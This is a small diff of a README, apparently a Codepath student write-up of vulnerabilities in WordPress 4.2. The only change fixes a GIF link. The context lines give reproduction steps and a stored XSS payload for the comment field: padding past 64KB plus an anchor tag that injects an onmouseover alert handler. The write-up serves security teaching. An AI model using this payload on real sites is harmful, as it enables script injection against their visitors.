@@ -13,7 +13,7 @@ Time spent: **24** hours spent in total
     - Vulnerability types: XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.1
-  - [ ] GIF Walkthrough: ![](https://github.com/dallens/CodepathWeek7Wordpress/XssWeek7.gif)
+  - [ ] GIF Walkthrough: ![](https://github.com/dallens/CodepathWeek7Wordpress/blob/master/XssWeek7.gif)
   - [ ] Steps to recreate: 
 		1. Over 64kb of data must be sent in the comment, achieved by padding the comment with over 64000 'X's . 
 		2. The script is thus: <a title='x onmouseover=alert(unescape(/hello%20dallens/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px --64000Xs--'></a>
